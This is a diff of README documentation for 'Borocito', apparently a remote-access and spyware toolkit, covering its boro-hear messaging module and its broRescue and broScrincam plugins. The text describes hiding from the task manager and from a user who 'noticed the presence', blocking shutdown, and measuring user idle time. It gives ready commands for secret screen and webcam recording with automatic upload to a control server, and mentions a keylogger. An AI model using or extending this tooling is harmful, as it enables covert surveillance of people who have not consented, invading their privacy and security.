@@ -61,7 +61,7 @@ Also, they can receive parameters when they are already started, so you can cont
 ### boro-hear
 boro-hear is a module that allows plugins to communicate (one-way C->S) with the Control Panel.  
 
-If you make a plugin, you can make it send messages to the control panel. In your code you should put something like [this code](https://github.com/Zhenboro/borocito-components/blob/e7eda70b99cfcfa2ea3a66223cc3564703051f29/broKiloger/Utility.vb#L8-L51).  
+If you make a plugin, you can make it send messages to the control panel. In your code you should put something like [this code](https://github.com/Zhenboro/borocito-components/blob/33632ac2104ceabbc001c9de55fb82cf519842f8/boro-get/Utility.vb#L40-L57).  
 That will start an instance of boro-hear which will send your message to the server. boro-hear is single-instance, but messages can be sent by passing parameters to it. These are picked up by boro-hear via the StartUpNextInstance event.  
 
 ---
@@ -158,6 +158,8 @@ Can't undestand a shit? [Key mapping for broKiloger keylog](https://chemic-jug.0
 
 ---
 ### broRescue
+> NOTE: Single Instance Package  
+
 This plugin was created because it turns out that sometimes an instance of BorocitoCLI can be closed by some external or internal factor. Perhaps the user noticed the presence and closed it, or, a command left a mess that BorocitoCLI couldn't handle.  
 For this reason, broRescue is a good recommendation that it be installed.  
 **And what does it do?**  
@@ -171,58 +173,78 @@ Or even restart the computer with the command:
 `broRescue Restart`  
 And, you can also try to prevent the computer from being turned off. with `broRescue NoShutdown` to avoid or, `YesShutdown` to not try to avoid.  
 This packet reads directly from the server. Every 5 minutes. So yes, you will notice the effect in 5 minutes. And that is done so as not to load the server, and also so that it is not noticed from the task manager.  
+**You can also get the number of seconds since the user's last activity with the command:**  
+```sh
+/GetAFK
+```
+Example:  
+```sh
+boro-get broRescue True /GetAFK
+```
+Data returned *(boro-hear must be installed)* 
+*The response is immediate (not 5 minutes later)*
+```sh
+Return
+	uInteger
+		(in seconds)
+Example
+	60
+		(1min (60sec) of inactivity)
+	0
+		(0s of inactivity. The user is active)
+```  
 
 This comp will start with windows.  
 
 ---
 ### broScrincam
+> NOTE: Single Instance Package  
 
 This plugin is for:  
 - Take photos from a Webcam (not coded yet)  
 - Record video from a Webcam (not coded yet)  
-- Record screen  
-
-> NOTE: Single Instance Package  
+- Record screen (it should work)  
+*The function to record the screen should work, but in my case the server does NOT allow uploading the recording file because it is very large*  
 
 ```sh
 /startscreenrecording: Will start to record the screen.
 boro-get broScrincam True /startscreenrecording
 ```  
-
+---
 ```sh
 /stopscreenrecording: It is supposed to stop screen recording. 
 boro-get broScrincam True /stopscreenrecording
 ```  
 > NOTE: It will not save or send the record.
-
+---
 ```sh
 /sendscreenrecord: It stop, save and send the screen recording.
 boro-get broScrincam True /sendscreenrecord
 ```  
-
+---
 ```sh
 /startcamrecording: It will start to record video from the webcam
 boro-get broScrincam True /startcamrecording
 ```  
-
+---
 ```sh
 /takecampicture: It will take a screenshot of the webcam
 boro-get broScrincam True /takecampicture
 ```  
 > NOTE: It will be sent automatically.  
-
+---
 ```sh
 /stopcamrecording: It will stop the Webcam recording.
 boro-get broScrincam True /stopcamrecording
 ```  
 > NOTE: It will not save or send the record.  
-
+---
 ```sh
 /sendcamrecord: It will stop the Webcam recording and send it automatically.
 boro-get broScrincam True /sendcamrecord
 ```
 > NOTE: It will be sent automatically.
-
+---
 ```sh
 /stop: It will send the keylogger and then start recording again.
 boro-get broScrincam True /stop
